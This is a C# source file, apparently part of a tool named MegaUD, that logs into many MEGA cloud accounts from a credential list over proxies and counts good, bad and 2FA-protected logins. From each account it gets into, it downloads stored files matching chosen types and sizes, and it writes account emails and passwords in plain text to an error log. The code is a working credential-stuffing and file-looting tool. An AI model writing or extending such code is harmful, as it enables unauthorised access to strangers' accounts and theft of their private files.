using MegaApiClientCore;
using MegaUD.Extensions;
using MegaUD.Model;
using Spectre.Console;

namespace MegaUD.WorkStation;

public class WorkStationMegaDownload : WorkStationMega
{
    private List<string> FileTypes { get; }
    private int MaxFileSize { get; }
    private string DirectoryForDownloadedFiles { get; }
    private int Retries { get; }

    public WorkStationMegaDownload(AccountPath accountPath, int thread, int retries, List<string> fileTypes,
        int maxFileSize, string directoryForDownloadedFiles, ProxyPath? proxyPath = null) : base(accountPath, thread, proxyPath)
    {
        Retries = retries;
        FileTypes = fileTypes;
        MaxFileSize = maxFileSize;
        DirectoryForDownloadedFiles = directoryForDownloadedFiles;
    }

    #region Stats

    private int Downloaded { get; set; }
    private int ErrorDownload { get; set; }

    #endregion

    #region Lockers

    private readonly object _lockerErrorDownloadFiles = new();

    #endregion

    private uint RndNumber { get; set; } = 0;


    protected override async Task<bool> Step(MegaApiClient megaApiClient)
    {
        await Download(megaApiClient);
        return true;
    }
    private async Task<bool> Download(MegaApiClient megaApiClient)
    {
        IEnumerable<INode> nodes = (await megaApiClient.GetNodesAsync())
            .Where(node => node.Type == NodeType.File &&
                           node.Size / 1000 <= MaxFileSize &&
                           node.Name.EndsWith(FileTypes)).ToList();

        if (!nodes.Any()) return false;

        foreach (INode node in nodes)
        {
            await DownloadNode(node, megaApiClient);
        }

        return true;
    }

    private async Task<bool> DownloadNode(INode node, MegaApiClient megaApiClient)
    {
        int cycleReDownload = 0;

        ReDownload:
        try
        {
            await megaApiClient.DownloadFileAsync(node, DirectoryForDownloadedFiles + $"\\{++RndNumber}_{node.Name}", null, Token);
            Downloaded++;
        }
        catch (Exception ex)
        {
            if (Retries >= cycleReDownload)
            {
                cycleReDownload++;
                goto ReDownload;
            }

            lock (_lockerErrorDownloadFiles)
            {
                File.AppendAllText(LocalDirectory + "\\[ErrorDownload] " + DateForSave + ".txt",
                    $"Credentials: {megaApiClient.Email}:{megaApiClient.Password}\n File name: {node.Name}\n Exception message: {ex.Message}");
            }

            ErrorDownload++;
            return false;
        }

        return true;
    }

    protected override async Task TimerTik()
    {
        await AnsiConsole.Progress()
            .StartAsync(async ctx =>
            {
                // Define tasks
                var task1 = ctx.AddTask("[green]Progress: [/]");
                task1.MaxValue = TotalAccounts;

                while (!ctx.IsFinished)
                {
                    // Simulate some work
                    await Task.Delay(250);
                    Console.Title =
                        $"Threads: {Threads} | Accounts: {TotalAccounts} | Good: {GoodAccounts} | Bad: {BadAccounts} | 2FA: {TwoFa} | Downloaded: {Downloaded} | ErrorDownload: {ErrorDownload} | Proxy: {TotalProxies} ErrorProxy: {ErrorProxy}";
                    task1.Value = Progress;
                }
            });
    }
}